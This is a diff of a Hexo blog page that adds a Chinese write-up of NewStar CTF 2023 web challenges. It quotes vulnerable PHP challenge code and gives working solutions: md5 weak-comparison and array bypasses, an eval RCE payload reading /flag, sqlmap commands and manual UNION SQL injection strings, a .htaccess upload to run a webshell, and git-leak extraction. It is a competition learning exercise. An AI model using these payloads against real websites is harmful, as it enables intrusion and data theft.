@@ -4,8 +4,11 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="test, Hexo">
-    <meta name="description" content="">
+    <meta name="keywords" content="Newstar2023 Web, Hexo">
+    <meta name="description" content="Newstar2023 Web
+md5绕过
+
+QNKCDZO240610708s878926199as155964671as214587387as214587387a这些字符串的 md5 值都是 0e 开头，在 php 弱类型比较中判断为相">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -17,7 +20,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>test | Hexo</title>
+    <title>Newstar2023 Web | Hexo</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
 
@@ -334,12 +337,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/10.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/21.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">test</h1>
+                    <h1 class="description center-align post-title">Newstar2023 Web</h1>
                 </div>
             </div>
         </div>
@@ -361,9 +364,17 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                          <div class="article-tag">
-                            <span class="chip bg-color">No tag</span>
-                          </div>
+                    <div class="article-tag">
+                        
+                            <a href="/tags/Web/">
+                                <span class="chip bg-color">Web</span>
+                            </a>
+                        
+                            <a href="/tags/Web-CTF/">
+                                <span class="chip bg-color">Web/CTF</span>
+                            </a>
+                        
+                    </div>
                     
                 </div>
                 <div class="col s5 right-align">
@@ -375,7 +386,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2023-11-15
+                    2023-11-16
                 </div>
                 
 
@@ -396,7 +407,46 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                
+                <h1 id="Newstar2023-Web"><a href="#Newstar2023-Web" class="headerlink" title="Newstar2023 Web"></a>Newstar2023 Web</h1><ol>
+<li>md5绕过</li>
+</ol>
+<p>QNKCDZO<br>240610708<br>s878926199a<br>s155964671a<br>s214587387a<br>s214587387a<br>这些字符串的 md5 值都是 0e 开头，在 php 弱类型比较中判断为相等</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;key1&#x27;]) &amp;&amp; isset($_GET[&#x27;key2&#x27;]))&#123;</span><br><span class="line">    echo &quot;=Level 1=&lt;br&gt;&quot;;</span><br><span class="line">    if($_GET[&#x27;key1&#x27;] !== $_GET[&#x27;key2&#x27;] &amp;&amp; md5($_GET[&#x27;key1&#x27;]) == md5($_GET[&#x27;key2&#x27;]))&#123;</span><br><span class="line">        $flag1 = True;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;nope,this is level 1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if($flag1)&#123;</span><br><span class="line">    echo &quot;=Level 2=&lt;br&gt;&quot;;</span><br><span class="line">    if(isset($_POST[&#x27;key3&#x27;]))&#123;</span><br><span class="line">        if(md5($_POST[&#x27;key3&#x27;]) === sha1($_POST[&#x27;key3&#x27;]))&#123;</span><br><span class="line">            $flag2 = True;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;nope,this is level 2&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if($flag2)&#123;</span><br><span class="line">    echo &quot;=Level 3=&lt;br&gt;&quot;;</span><br><span class="line">    if(isset($_GET[&#x27;key4&#x27;]))&#123;</span><br><span class="line">        if(strcmp($_GET[&#x27;key4&#x27;],file_get_contents(&quot;/flag&quot;)) == 0)&#123;</span><br><span class="line">            $flag3 = True;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            die(&quot;nope,this is level 3&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if($flag3)&#123;</span><br><span class="line">    echo &quot;=Level 4=&lt;br&gt;&quot;;</span><br><span class="line">    if(isset($_GET[&#x27;key5&#x27;]))&#123;</span><br><span class="line">        if(!is_numeric($_GET[&#x27;key5&#x27;]) &amp;&amp; $_GET[&#x27;key5&#x27;] &gt; 2023)&#123;</span><br><span class="line">            $flag4 = True;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            die(&quot;nope,this is level 4&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if($flag4)&#123;</span><br><span class="line">    echo &quot;=Level 5=&lt;br&gt;&quot;;</span><br><span class="line">    extract($_POST);</span><br><span class="line">    foreach($_POST as $var)&#123;</span><br><span class="line">        if(preg_match(&quot;/[a-zA-Z0-9]/&quot;,$var))&#123;</span><br><span class="line">            die(&quot;nope,this is level 5&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if($flag5)&#123;</span><br><span class="line">        echo file_get_contents(&quot;/flag&quot;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;nope,this is level 5&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>level1要求我们GET传入key1与key2，值不相等，md5值相等，故传入两个md5值开头为0e开头的字符串，在php弱比较中相等</p>
+<p>level2要求我们POST传入key3，且md5值与sha1值相等，故传入key3[]&#x3D;!，md5与sha1处理数组返回皆为NULL，故相等</p>
+<p>level3要求我们GET传入key4，strcmp用于比较两个字符串的长度，若前者大于后者则返回&gt;0，反之则返回&lt;0，只有两者相等时返回0，但处理其他类型数据时会报错返回0，因此传入key4[]&#x3D;1</p>
+<p>level4要求我们GET传入key5，key5值大于2023且key5不为数字，在key5&#x3D;2024后加个a即可绕过is_numric</p>
+<p>level5使用了extract($_POST)并用foreach遍历POST传入的每个值，判断是否存在数字和字母，并且判断flag5为真即可得到flag，我们可以利用extract方法覆盖变量flag5，POST传入flag5&#x3D;’即可获得flag<br><img src="/@attachment/Clipboard_2023-10-21-21-14-15.png"></p>
+<ol start="2">
+<li>R!C!E!<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_POST[&#x27;password&#x27;])&amp;&amp;isset($_POST[&#x27;e_v.a.l&#x27;]))&#123;</span><br><span class="line">    $password=md5($_POST[&#x27;password&#x27;]);</span><br><span class="line">    $code=$_POST[&#x27;e_v.a.l&#x27;];</span><br><span class="line">    if(substr($password,0,6)===&quot;c4d038&quot;)&#123;</span><br><span class="line">        if(!preg_match(&quot;/flag|system|pass|cat|ls/i&quot;,$code))&#123;</span><br><span class="line">            eval($code);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>本题首先要求我们POST传入变量password并且要该变量的md5值前六位为c4d038.代入脚本碰撞</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">for i in range(0,9999999999999999):</span><br><span class="line">    md5 = hashlib.md5(str(i).encode(&quot;utf-8&quot;)).hexdigest()</span><br><span class="line">    if md5[0:6] == &quot;c4d038&quot;:</span><br><span class="line">        print(i)</span><br></pre></td></tr></table></figure>
+<p>得到114514符合条件</p>
+<p>然后POST传入变量e_v.a.l，但由于PHP特性解析字符串作为变量名时会进行一次替换某些非法字符，比如将 [ 替换为 _ ，因此我们将变量名改为e[v.a.l<br>preg_match过滤system，pass，无法嵌套passthru()与system()</p>
+<p><code>payload:password=114514&amp;e[v.a.l=var_dump(file_get_contents($_POST[&#39;a&#39;]));&amp;a=/flag</code></p>
+<ol start="3">
+<li><p>EasyLogin<br>Ctrl+D退出终端<br>BurpSuite爆破弱口令</p>
+</li>
+<li><p>include0。0<br>过滤了base64编码与rot13编码，我们可以利用iconv方法，具体见<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44657899/article/details/109300335">php:&#x2F;&#x2F;的各种过滤器</a><br><img src="/@attachment/Clipboard_2023-10-22-11-17-40.png"></p>
+</li>
+<li><p>ez_sql<br>sqlmap一把梭，发现存在布尔盲注，时间注入，Union注入<br>sqlmap -u ‘url’ –dbs<br><img src="/@attachment/Clipboard_2023-10-22-11-39-24.png"><br>sqlmap -u ‘url’ -D ctf –tables<br><img src="/@attachment/Clipboard_2023-10-22-11-40-08.png"><br>sqlmap -u ‘url’ -D ctf -T here_is_flag –columns<br><img src="/@attachment/Clipboard_2023-10-22-11-40-17.png"><br>sqlmap -u ‘url’ -D ctf -T here_is_flag -C flag –dump<br><img src="/@attachment/Clipboard_2023-10-22-11-41-20.png"></p>
+</li>
+</ol>
+<p>手工注入:<br>id&#x3D;1’时不回显，id&#x3D;1’+and+1&#x3D;1–+时回显no，换成or也一样，判断存在敏感字符过滤，故使用大写绕过</p>
+<p>访问id&#x3D;1’+Order+By+5–+，与id&#x3D;1一样<br>访问id&#x3D;1’+Order+By+6–+，发现无回显，则字段数为5，可以在字段执行SQL语句<br>由于数据直接被输出到页面上，故使用Union注入，语句为id&#x3D;1’+Union+Select+1,2,3,4,5–+<br>查询当前数据库库名：<br><code>id=1&#39;+Union+Select+1,database(),3,4,5--+,</code><br>得到库名 <strong>ctf</strong></p>
+<p>查询表名：<br><code>id=-1&#39;+Union+sElect+1,(SeLect+Table_Name+From+InFOrmation_Schema.Tables+whEre+TaBle_Schema=&#39;ctf&#39;+Limit+0,1),3,4,5--+</code><br>得到表名 <strong>grade</strong><br>查询第二个表名只需将limit后的第一位数字改为1，得到表名 <strong>here_is_flag</strong></p>
+<p>查询字段名：<br><code>id=-1&#39;+Union+sElect+1,(SeLect+ColuMn_Name+From+InFOrmation_Schema.ColuMns+whEre+TaBle_Schema=&#39;ctf&#39;+And+Table_Name=&#39;here_is_flag&#39;+Limit+0,1),3,4,5--+</code><br>得到字段名 <strong>flag</strong></p>
+<p>获取了数据库的库名，表名和字段名，即可查询数据库的数据，语句如下<br><code>id=-1&#39;+Union+sElect+1,(Select+flag+From+ctf.here_is_flag+Limit+0,1),3,4,5--+</code><br>得到flag<br><img src="/@attachment/Clipboard_2023-10-22-12-37-16.png"></p>
+<ol start="5">
+<li>Upload Again!<br>直接上传php文件报错，修改为jpg后缀显示 <em>这不还是php？</em> 判断后台会对文件内容进行检查<br>使用第五种php标记<code>&lt;script language=&quot;php&quot;&gt;&lt;/script&gt;</code>，显示上传成功并显示路径<br>然而此时蚁剑并不能连接，因为该文件依然被解析为jpg文件<br>学习后可知<br><em>“.htaccess”文件或者称为分布式配置文件，它是 Apache 服务器中的配置文件，提供了针对每个目录设置不同的配置的方法。有些服务器在上传认证时没有拦截.htaccess文件上传，就会造成恶意用户利用上传 .htaccess 文件解析漏洞，来绕过验证进行上传WEBShell，从而达到控制网站服务器的目的。”</em></li>
+</ol>
+<p>因此上传一个.htaccess文件，内容为<br><code>AddType application/x-httpd-php .jpg</code>&#x2F;&#x2F;将所有jpg文件解析为php文件<br>然后蚁剑连接即可</p>
+<p>PS：执行phpinfo()发现php版本为5.6.40，而%00截断只适用于5.4.45版本及以下，因此无法运用.php%00.jpg绕过</p>
+<ol start="6">
+<li>R!!C!!E!!<br>提示信息泄露，于是访问url&#x2F;.git，发现存在该网址，使用GitHack下载泄露的git储存库<br><code>python githack.py url/.git</code></li>
+</ol>
+
                 
             </div>
             <hr/>
@@ -422,7 +472,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2023/11/15/test/">http://example.com/2023/11/15/test/</a>
+                    <a href="http://example.com/2023/11/16/newstar2023-web/">http://example.com/2023/11/16/newstar2023-web/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -459,7 +509,15 @@
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            <span class="chip bg-color">No tag</span>
+                            
+                                <a href="/tags/Web/">
+                                    <span class="chip bg-color">Web</span>
+                                </a>
+                            
+                                <a href="/tags/Web-CTF/">
+                                    <span class="chip bg-color">Web/CTF</span>
+                                </a>
+                            
                         </div>
                     
                 </div>
@@ -536,9 +594,10 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
+                <i class="far fa-dot-circle"></i>&nbsp;Current
+            </div>
             <div class="card">
                 <a href="/2023/11/16/newstar2023-web/">
                     <div class="card-image">
@@ -556,9 +615,9 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2023-11-16
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-11-16
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -567,6 +626,7 @@
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -589,13 +649,13 @@
                 Next&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2023/11/15/hello-world/">
+                <a href="/2023/11/15/test/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="Hello World">
+                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="test">
                         
-                        <span class="card-title">Hello World</span>
+                        <span class="card-title">test</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
